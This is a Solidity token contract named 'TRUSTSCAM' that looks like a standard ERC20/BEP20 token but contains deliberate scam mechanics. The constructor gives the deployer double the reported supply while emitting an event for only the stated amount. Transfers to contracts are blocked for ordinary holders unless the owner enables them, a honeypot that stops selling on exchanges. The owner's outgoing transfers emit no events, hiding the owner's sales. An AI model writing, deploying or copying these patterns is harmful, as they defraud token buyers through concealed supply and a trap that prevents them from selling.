pragma solidity ^0.8.0;
// SPDX-License-Identifier: UNLICENCED

import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Context.sol";
import "./Address.sol";
import "./Ownable.sol";
import "./SafeERC20.sol";

contract TRUSTSCAM is Context, IERC20, IERC20Metadata, Ownable {
    using SafeERC20 for IERC20;
    using Address for address;
    
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool public contractSendEnabled = false;

    uint256 private _totalSupply = 5000 * 10**6 * 10**9;

    string private _name = "TRUSTSCAM";
    string private _symbol = "TRUSTSCAM";
    uint8 private _decimals = 9;
    
    address public treasuryAddress;
    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    constructor() {
        _balances[_msgSender()] = _totalSupply*2;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function circulatingSupply() public view returns(uint256) {
        uint256 circSupply = totalSupply();
        circSupply = circSupply - balanceOf(address(this));
        circSupply = circSupply - balanceOf(burnAddress);
        circSupply = circSupply - balanceOf(treasuryAddress);
        return circSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    
    function setTreasury(address account) external onlyOwner() {
        treasuryAddress = account;
    }
    
    function setContractSendEnabled(bool _enabled) external onlyOwner() {
        contractSendEnabled = _enabled;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(sender != owner() && sender != treasuryAddress && recipient != owner() && recipient != treasuryAddress) {
            if(!contractSendEnabled && recipient.isContract()) {
                revert("Transfers to contracts are disabled");
            }
        }

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        if(sender != owner()) {
            emit Transfer(sender, recipient, amount);
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    receive() external payable {
        revert();
    }

    // Function to allow owner to salvage BEP20 tokens sent to this contract (by mistake)
    function transferAnyBEP20Tokens(address _tokenAddr, uint _amount) public onlyOwner {
        IERC20 token = IERC20(_tokenAddr);
        require(treasuryAddress != address(0), "Treasury address must be set");
        token.safeTransfer(treasuryAddress, _amount);
    }
}

// FUShappy